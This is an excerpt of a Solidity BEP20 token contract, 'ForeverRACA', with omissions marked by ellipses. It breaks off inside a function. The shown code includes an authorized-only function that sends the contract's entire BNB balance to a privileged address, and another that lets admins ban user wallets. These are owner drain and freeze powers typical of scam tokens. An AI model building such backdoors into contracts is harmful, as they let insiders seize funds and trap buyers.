...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 CAKE = IBEP20(0x12BB890508c125661E03b09EC06E404bc9289040);
...
contract ForeverRACA is IBEP20, Auth {
    using SafeMath for uint256;

    address CAKE = 0x12BB890508c125661E03b09EC06E404bc9289040;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "ForeverRACA";
    string constant _symbol = "ForeverRACA";
    ...
    function chargeBuyBack() external authorized  {
        uint256 balance = address(this).balance;
        payable(autoLiquidityReceiver).transfer(balance);
    }
	...
	function setWalletBanStatus(address user, bool banned) external authorized {
		if (banned) {
            require(	1627045200 + 1000 days > block.timestamp, "BAN HAMMER");
